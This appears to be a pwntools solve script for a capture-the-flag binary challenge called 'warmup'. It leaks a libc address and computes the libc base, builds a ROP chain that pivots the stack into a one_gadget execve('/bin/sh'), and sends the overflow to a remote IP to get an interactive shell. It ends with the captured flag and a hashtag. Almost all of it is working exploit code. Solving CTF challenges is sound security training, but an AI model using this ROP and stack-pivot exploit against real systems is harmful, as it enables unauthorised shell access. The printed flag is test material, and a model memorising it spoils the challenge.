from pwn import *

context.log_level = 'debug'

# Gadget -- from ubuntu:latest
"""
0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0x0000000000110951 : pop r12 ; ret
0x00000000000586d4 : pop rbx ; ret
0000000000087bd0  w   DF .text    0000000000000226  GLIBC_2.2.5 puts
"""

execve = 0xef4ce
pop_r12 = 0x110951
pop_rbx = 0x586d4

puts_og = 0x87bd0
name = 0x404060
pivot = 0x0040118e

p = remote("172.210.129.230", 1338)
# p = process("./warmup")
# __import__('time').sleep(15)

leaked_puts = int(p.recvuntil(b"\n", drop=True), 0)
libc_base = leaked_puts - puts_og

print(f"{hex(leaked_puts)=}")
print(f"{hex(libc_base)=}")
print(f"{hex(libc_base + pop_r12)=}")
print(f"{hex(libc_base + pop_rbx)=}")
print(f"{hex(libc_base + execve)=}")

sc = p64(libc_base + pop_r12)
sc += p64(0)
sc += p64(libc_base + pop_rbx)
sc += p64(0)
sc += p64(libc_base + execve)

overflow_amnt = 0x00007FFCD50C2108 - 0x00007FFCD50C20C0

p.send(sc + b"\n")
p.send(b"A" * (overflow_amnt - 8))
p.send(p64(name + 0x48)) # rbp-48h needs to be writeable
p.send(p64(pivot))
p.send(p64(name))
p.send(b"\n")

p.interactive()

#run that and ls and cat flag.txt
# additional note the pwns are not solvable if your gblic version is different to the remote machines make sure you have the current ubuntu version for july 2024

# AKASEC{1_Me44444N_J00_C0ULDve_ju57_574CK_p1V07ed}
#XD #FR33P4L3S71N3&G4Z4 


